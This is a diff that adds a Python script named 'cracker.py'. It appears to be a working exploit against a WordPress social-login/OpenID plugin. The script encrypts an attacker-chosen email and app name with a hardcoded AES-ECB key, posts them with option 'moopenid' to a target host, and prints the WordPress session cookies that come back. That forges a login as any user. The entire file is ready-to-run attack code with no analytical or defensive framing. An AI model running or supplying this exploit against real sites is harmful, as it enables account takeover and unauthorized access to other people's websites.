@@ -1,0 +1,68 @@
+import sys
+import requests
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad
+import base64
+
+def encode(email: str, app_name: str) -> [str, str]:
+    
+    key = 'jMj7MEdu4wkHObiD'
+    
+    #create a new cipher object
+    cipher = AES.new(key.encode('utf-8'), AES.MODE_ECB)
+    #pad email to AES block size so it can be encrypted
+    padded_email = pad(email.encode('utf-8'), AES.block_size)
+    #encrypt the padded email
+    encrypted_email = cipher.encrypt(padded_email)
+    #encode the encrypted email in base 64
+    encoded_email = base64.b64encode(encrypted_email).decode('utf-8')
+    
+    #pad app name to AES block size so it can be encrypted
+    padded_app_name = pad(app_name.encode('utf-8'), AES.block_size)
+    #encrypt the padded app name
+    encrypted_app_name = cipher.encrypt(padded_app_name)
+    #encode the encrypted app name in base 64
+    encoded_app_name = base64.b64encode(encrypted_app_name).decode('utf-8')
+    
+    return encoded_email, encoded_app_name
+
+def post(encoded_email: str, encoded_app_name: str, host: str) -> requests.Response:
+    #send a post request to the host with the encoded email and app name
+    response = requests.post(host, headers={'Content-Type': 'application/x-www-form-urlencoded'},
+                             data={'option': 'moopenid', 'email': encoded_email, 'appName': encoded_app_name},
+                             allow_redirects=False)
+    return response
+
+
+
+
+if __name__ == '__main__':
+    if len(sys.argv) < 4:
+        print('Usage: python3 cracker.py <email> <app_name> <host>')
+        sys.exit(1)
+    email = sys.argv[1]
+    app_name = sys.argv[2]
+    host = sys.argv[3]
+    encoded_email, encoded_app_name = encode(email, app_name)
+    
+    print('Encoded email: {}'.format(encoded_email))
+    print('Encoded app name: {}\n'.format(encoded_app_name))
+    response = post(encoded_email, encoded_app_name, host)
+    
+    
+    if len(response.cookies) == 0:
+        print('No cookies received')
+    else:
+        print('Response Cookies:\n')
+        #print all the cookies received
+        for cookie in response.cookies:
+            #the cookies we are interested in start with wordpress
+            if cookie.name.startswith('wordpress'):
+                print('Name: {}'.format(cookie.name))
+                print('Value: {}'.format(cookie.value))
+                print('Domain: {}'.format(cookie.domain))
+                print('Path: {}'.format(cookie.path))
+                print('Expires: {}'.format(cookie.expires))
+                print('Secure: {}'.format(cookie.secure))
+                print('HttpOnly: {}\n\n'.format(cookie.has_nonstandard_attr('httponly')))
+                
